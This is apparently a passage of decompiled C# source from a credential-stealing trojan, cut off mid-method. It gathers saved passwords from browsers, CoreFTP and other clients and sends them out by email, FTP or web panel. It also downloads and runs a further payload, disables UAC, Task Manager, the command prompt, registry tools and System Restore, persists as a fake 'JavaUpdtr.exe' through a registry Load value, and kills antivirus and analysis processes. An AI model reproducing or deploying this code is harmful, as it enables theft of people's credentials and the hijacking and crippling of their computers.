				foreach (JK item5 in AEM.SV())
				{
					string browser = item5.NP_115;
					string uRL = item5.WE_114;
					string userName = item5.ECS_112;
					string password = item5.GA_113;
					if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
					{
						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
						{
							stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
						}
						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
						{
							stringBuilder.AppendLine("<br>");
							stringBuilder.AppendLine("URL:      " + uRL + "<br>");
							stringBuilder.AppendLine("Username: " + userName + "<br>");
							stringBuilder.AppendLine("Password: " + password + "<br>");
							stringBuilder.AppendLine("Application: " + browser + "<br>");
						}
					}
				}
			}
		}
		catch (Exception ex45)
		{
			ProjectData.SetProjectError(ex45);
			Exception ex46 = ex45;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj18 = AEM.UDQ();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj18, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator23 = default(IEnumerator);
				try
				{
					enumerator23 = ((IEnumerable)obj18).GetEnumerator();
					while (enumerator23.MoveNext())
					{
						JK jK19 = (JK)enumerator23.Current;
						string browser = jK19.NP_115;
						string uRL = jK19.WE_114;
						string userName = jK19.ECS_112;
						string password = jK19.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator23 is IDisposable)
					{
						(enumerator23 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex47)
		{
			ProjectData.SetProjectError(ex47);
			Exception ex48 = ex47;
			ProjectData.ClearProjectError();
		}
		try
		{
			string kH_ = Interaction.Environ("APPDATA") + @"\CoreFTP\sites.idx";
			string str = S_.TG(kH_);
			string text = S_.DD(@"HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" + str + "Host");
			string text2 = S_.DD("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str + "Port");
			string text3 = S_.DD("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str + "User");
			string text4 = S_.DD("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str + "PW");
			string text5 = S_.DD("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str + "Name");
			string browser = "CoreFTP";
			string uRL = text;
			string userName = text3;
			string password = text4;
			if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
			{
				if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
				{
					stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
				}
				else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
				{
					stringBuilder.AppendLine("<br>");
					stringBuilder.AppendLine("URL:      " + uRL + "<br>");
					stringBuilder.AppendLine("Username: " + userName + "<br>");
					stringBuilder.AppendLine("Password: " + password + "<br>");
					stringBuilder.AppendLine("Application: " + browser + "<br>");
				}
			}
		}
		catch (Exception ex49)
		{
			ProjectData.SetProjectError(ex49);
			Exception ex50 = ex49;
			ProjectData.ClearProjectError();
		}
		try
		{
			if (AEM.LIB().Count > 0)
			{
				foreach (JK item6 in AEM.LIB())
				{
					string browser = item6.NP_115;
					string uRL = item6.WE_114;
					string userName = item6.ECS_112;
					string password = item6.GA_113;
					if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
					{
						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
						{
							stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
						}
						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
						{
							stringBuilder.AppendLine("<br>");
							stringBuilder.AppendLine("URL:      " + uRL + "<br>");
							stringBuilder.AppendLine("Username: " + userName + "<br>");
							stringBuilder.AppendLine("Password: " + password + "<br>");
							stringBuilder.AppendLine("Application: " + browser + "<br>");
						}
					}
				}
			}
		}
		catch (Exception ex51)
		{
			ProjectData.SetProjectError(ex51);
			Exception ex52 = ex51;
			ProjectData.ClearProjectError();
		}
		try
		{
			if (AEM.KJ().Count > 0)
			{
				foreach (JK item7 in AEM.KJ())
				{
					string browser = item7.NP_115;
					string uRL = item7.WE_114;
					string userName = item7.ECS_112;
					string password = item7.GA_113;
					if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
					{
						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
						{
							stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
						}
						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
						{
							stringBuilder.AppendLine("<br>");
							stringBuilder.AppendLine("URL:      " + uRL + "<br>");
							stringBuilder.AppendLine("Username: " + userName + "<br>");
							stringBuilder.AppendLine("Password: " + password + "<br>");
							stringBuilder.AppendLine("Application: " + browser + "<br>");
						}
					}
				}
			}
		}
		catch (Exception ex53)
		{
			ProjectData.SetProjectError(ex53);
			Exception ex54 = ex53;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj19 = AEM.FDL();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj19, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator26 = default(IEnumerator);
				try
				{
					enumerator26 = ((IEnumerable)obj19).GetEnumerator();
					while (enumerator26.MoveNext())
					{
						JK jK20 = (JK)enumerator26.Current;
						string browser = jK20.NP_115;
						string uRL = jK20.WE_114;
						string userName = jK20.ECS_112;
						string password = jK20.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator26 is IDisposable)
					{
						(enumerator26 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex55)
		{
			ProjectData.SetProjectError(ex55);
			Exception ex56 = ex55;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj20 = AEM.GMF();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj20, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator27 = default(IEnumerator);
				try
				{
					enumerator27 = ((IEnumerable)obj20).GetEnumerator();
					while (enumerator27.MoveNext())
					{
						JK jK21 = (JK)enumerator27.Current;
						string browser = jK21.NP_115;
						string uRL = jK21.WE_114;
						string userName = jK21.ECS_112;
						string password = jK21.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator27 is IDisposable)
					{
						(enumerator27 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex57)
		{
			ProjectData.SetProjectError(ex57);
			Exception ex58 = ex57;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj21 = AEM.XN();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj21, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator28 = default(IEnumerator);
				try
				{
					enumerator28 = ((IEnumerable)obj21).GetEnumerator();
					while (enumerator28.MoveNext())
					{
						JK jK22 = (JK)enumerator28.Current;
						string browser = jK22.NP_115;
						string uRL = jK22.WE_114;
						string userName = jK22.ECS_112;
						string password = jK22.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator28 is IDisposable)
					{
						(enumerator28 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex59)
		{
			ProjectData.SetProjectError(ex59);
			Exception ex60 = ex59;
			ProjectData.ClearProjectError();
		}
		try
		{
			if (AEM.OK().Count > 0)
			{
				foreach (JK item8 in AEM.OK())
				{
					string browser = item8.NP_115;
					string uRL = item8.WE_114;
					string userName = item8.ECS_112;
					string password = item8.GA_113;
					if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
					{
						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
						{
							stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
						}
						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
						{
							stringBuilder.AppendLine("<br>");
							stringBuilder.AppendLine("URL:      " + uRL + "<br>");
							stringBuilder.AppendLine("Username: " + userName + "<br>");
							stringBuilder.AppendLine("Password: " + password + "<br>");
							stringBuilder.AppendLine("Application: " + browser + "<br>");
						}
					}
				}
			}
		}
		catch (Exception ex61)
		{
			ProjectData.SetProjectError(ex61);
			Exception ex62 = ex61;
			ProjectData.ClearProjectError();
		}
		try
		{
			if (AEM.WQA().Count > 0)
			{
				foreach (JK item9 in AEM.WQA())
				{
					string browser = item9.NP_115;
					string uRL = item9.WE_114;
					string userName = item9.ECS_112;
					string password = item9.GA_113;
					if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
					{
						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
						{
							stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
						}
						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
						{
							stringBuilder.AppendLine("<br>");
							stringBuilder.AppendLine("URL:      " + uRL + "<br>");
							stringBuilder.AppendLine("Username: " + userName + "<br>");
							stringBuilder.AppendLine("Password: " + password + "<br>");
							stringBuilder.AppendLine("Application: " + browser + "<br>");
						}
					}
				}
			}
		}
		catch (Exception ex63)
		{
			ProjectData.SetProjectError(ex63);
			Exception ex64 = ex63;
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(S_.VC.LP(), null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator31 = default(IEnumerator);
				try
				{
					enumerator31 = ((IEnumerable)S_.VC.LP()).GetEnumerator();
					while (enumerator31.MoveNext())
					{
						JK jK23 = (JK)enumerator31.Current;
						string browser = jK23.NP_115;
						string uRL = jK23.WE_114;
						string userName = jK23.ECS_112;
						string password = jK23.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator31 is IDisposable)
					{
						(enumerator31 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex65)
		{
			ProjectData.SetProjectError(ex65);
			Exception ex66 = ex65;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj22 = AEM.CM();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj22, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator32 = default(IEnumerator);
				try
				{
					enumerator32 = ((IEnumerable)obj22).GetEnumerator();
					while (enumerator32.MoveNext())
					{
						JK jK24 = (JK)enumerator32.Current;
						string browser = jK24.NP_115;
						string uRL = jK24.WE_114;
						string userName = jK24.ECS_112;
						string password = jK24.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator32 is IDisposable)
					{
						(enumerator32 as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex67)
		{
			ProjectData.SetProjectError(ex67);
			Exception ex68 = ex67;
			ProjectData.ClearProjectError();
		}
		if (stringBuilder.ToString().Length > 10)
		{
			if (Operators.CompareString(WEL_46, "smtp", false) == 0)
			{
				try
				{
					string iMW_ = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Passwords Recovered From: " + GO_71;
					string hS_ = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + stringBuilder.ToString() + "</span>";
					MV("%toemail%", iMW_, hS_);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					stringBuilder = null;
					ProjectData.ClearProjectError();
				}
			}
			else if (Operators.CompareString(WEL_46, "ftp", false) == 0)
			{
				string format2 = "yyyy_MM_dd_HH_mm_ss";
				try
				{
					JP("Password_Recoveries_" + LR_70.Replace("/", "-") + "_" + DateTime.Now.ToString(format2) + ".html", "<html><span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + stringBuilder.ToString() + "</span></html>");
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					stringBuilder = null;
					ProjectData.ClearProjectError();
				}
			}
			stringBuilder = null;
		}
		if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
		{
			CC(stringBuilder2.ToString());
			stringBuilder2 = null;
		}
	}

	public static bool MV(string GX_160, string IMW_161, string HS_162, string XS_163 = "", string EM_164 = "")
	{
		//Discarded unreachable code: IL_00f5, IL_0108
		//IL_00ff: Expected O, but got I4
		//IL_0100: Expected O, but got I4
		try
		{
			SmtpClient smtpClient = new SmtpClient();
			MailAddress to = new MailAddress(GX_160);
			MailAddress from = new MailAddress("%mailaddres%");
			MailMessage mailMessage = new MailMessage(from, to);
			mailMessage.IsBodyHtml = true;
			mailMessage.Subject = IMW_161;
			mailMessage.Body = HS_162;
			if (Strings.Len(XS_163) > 0)
			{
				Attachment item = new Attachment(XS_163);
				mailMessage.Attachments.Add(item);
			}
			if (Strings.Len(EM_164) > 0)
			{
				Attachment item2 = new Attachment(EM_164);
				mailMessage.Attachments.Add(item2);
			}
			NetworkCredential credentials = new NetworkCredential("%mailaddres%", "%password%");
			smtpClient.Host = "%smtp%";
			smtpClient.UseDefaultCredentials = false;
			smtpClient.Credentials = credentials;
			smtpClient.EnableSsl = true;
			smtpClient.Port = 587;
			smtpClient.Send(mailMessage);
			mailMessage.Attachments.Dispose();
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, EntryPoint = "DeleteFile", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool MJ(string YDR_165);

	public static void JV(string NE_166)
	{
		//Discarded unreachable code: IL_002d, IL_0040
		//IL_0037: Expected O, but got I4
		try
		{
			if (File.Exists(NE_166))
			{
				MJ(NE_166 + ":Zone.Identifier");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void XEN()
	{
		//Discarded unreachable code: IL_0053, IL_0066
		//IL_005d: Expected O, but got I4
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile("%DownLink%", Path.GetTempPath() + "/%filename%");
			Process.Start(Path.GetTempPath() + "/%filename%");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void XWB()
	{
		//Discarded unreachable code: IL_01a6, IL_01b9
		//IL_01b0: Expected O, but got I4
		//IL_01b1: Expected O, but got I4
		try
		{
			if (YX_50)
			{
				W.F_4.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "0");
			}
			if (MB_51)
			{
				Interaction.Shell(@"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
			}
			if (SXG_52)
			{
				Interaction.Shell(@"REG add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
				W.F_4.Registry.SetValue(@"HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", RegistryValueKind.DWord);
			}
			if (RVD_53)
			{
				Interaction.Shell(@"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
			}
			if (MCO_56)
			{
				Interaction.Shell(@"REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
			}
			if (BVY_54)
			{
				W.F_4.Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", RegistryValueKind.String);
			}
			if (UE_55)
			{
				W.F_4.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", RegistryValueKind.DWord);
			}
			if (UYQ_58)
			{
				Interaction.Shell(@"REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
				Interaction.Shell(@"REG add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
			}
			if (BET_57)
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths", true);
				registryKey.DeleteSubKey("MSCONFIG.EXE", true);
				registryKey.Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetModuleFileNameA", ExactSpelling = true, SetLastError = true)]
	public static extern int KK(int CA_167, [MarshalAs(UnmanagedType.VBByRefStr)] ref string AA_168, int YUW_169);

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "MoveFileExW", ExactSpelling = true, SetLastError = true)]
	public static extern int FD([In][MarshalAs(UnmanagedType.LPTStr)] string WU_170, [In][MarshalAs(UnmanagedType.LPTStr)] string UN__171, long DK_172);

	public static void _Q()
	{
		//Discarded unreachable code: IL_0067, IL_007a
		//IL_0071: Expected O, but got I4
		//IL_0072: Expected O, but got I4
		try
		{
			string executablePath = Application.ExecutablePath;
			string AA_ = Application.ExecutablePath;
			FD(PT(executablePath, KK(0, ref AA_, 256)), Path.GetTempPath() + @"\tmpG" + DateTime.Now.Millisecond + ".tmp", 8L);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string PT(string VKN_173, int UW_174)
	{
		//Discarded unreachable code: IL_004b, IL_005e
		//IL_0055: Expected O, but got I4
		if (UW_174 < 0)
		{
			throw new ArgumentOutOfRangeException("length", UW_174, "length must be > 0");
		}
		if (UW_174 == 0 || VKN_173.Length == 0)
		{
			return "";
		}
		if (VKN_173.Length <= UW_174)
		{
			return VKN_173;
		}
		return VKN_173.Substring(0, UW_174);
	}

	public static bool SRX(string VA_175)
	{
		//Discarded unreachable code: IL_002a, IL_003d
		//IL_0034: Expected O, but got I4
		//IL_0035: Expected O, but got I4
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.StartsWith(VA_175))
			{
				return true;
			}
		}
		return false;
	}

	public static void YCQ(object QPO_176, ElapsedEventArgs AF_177)
	{
		//Discarded unreachable code: IL_0162, IL_0175
		//IL_016c: Expected O, but got I4
		if (!File.Exists(Environment.GetEnvironmentVariable("temp") + @"\JavaUpdtr.exe"))
		{
			File.Copy(Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe", Environment.GetEnvironmentVariable("temp") + @"\JavaUpdtr.exe");
		}
		else if (!File.Exists(Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe"))
		{
			File.Copy(Environment.GetEnvironmentVariable("temp") + @"\JavaUpdtr.exe", Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe");
		}
		if (!SRX("JavaUpdtr"))
		{
			try
			{
				Process.Start(Environment.GetEnvironmentVariable("appdata") + @"\Java\JavaUpdtr.exe");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true).SetValue("Load", Environment.GetEnvironmentVariable("appdata") + @"\JavaUpdtr.exe");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void XHL()
	{
		//Discarded unreachable code: IL_0035, IL_0048
		//IL_003f: Expected O, but got I4
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += UP;
		timer.Enabled = true;
		timer.Interval = 1000.0;
		timer.Start();
	}

	public static void JL()
	{
		//Discarded unreachable code: IL_0035, IL_0048
		//IL_003f: Expected O, but got I4
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += YNO;
		timer.Enabled = true;
		timer.Interval = 100.0;
		timer.Start();
	}

	public static void RO()
	{
		//Discarded unreachable code: IL_0035, IL_0048
		//IL_003f: Expected O, but got I4
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += IN;
		timer.Enabled = true;
		timer.Interval = 5000.0;
		timer.Start();
	}

	public static void IN(object MF_178, ElapsedEventArgs NJE_179)
	{
		//Discarded unreachable code: IL_01f2, IL_0205
		//IL_01fc: Expected O, but got I4
		string[] array = new string[28]
		{
			"anubis",
			"a2servic",
			"ashWebSv",
			"hvk",
			"avgemc",
			"bdagent",
			"avp",
			"keyscrambler",
			"mbam",
			"ekrn",
			"egui",
			"npfmsg",
			"ollydbg",
			"outpost",
			"wireshark",
			"mcagent",
			"mcuimgr",
			"clamauto",
			"cpf",
			"ewido",
			"FPAVServer",
			"SbieSvc",
			"antigen",
			"ccapp",
			"tmlisten",
			"pccntmon",
			"earthagent",
			"spysweeper"
		};
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				Process[] processes = Process.GetProcesses();
				int num2 = processes.Length - 1;
				for (int j = 0; j <= num2; j++)
				{
					if (Operators.CompareString(array[i], processes[j].ProcessName, false) == 0)
					{
						processes[j].Kill();
					}
				}
			}
		}
	}

	public static void UP(object OE_180, ElapsedEventArgs YZ_181)
	{
		//Discarded unreachable code: IL_0087, IL_009a
		//IL_0091: Expected O, but got I4
		//IL_0092: Expected O, but got I4
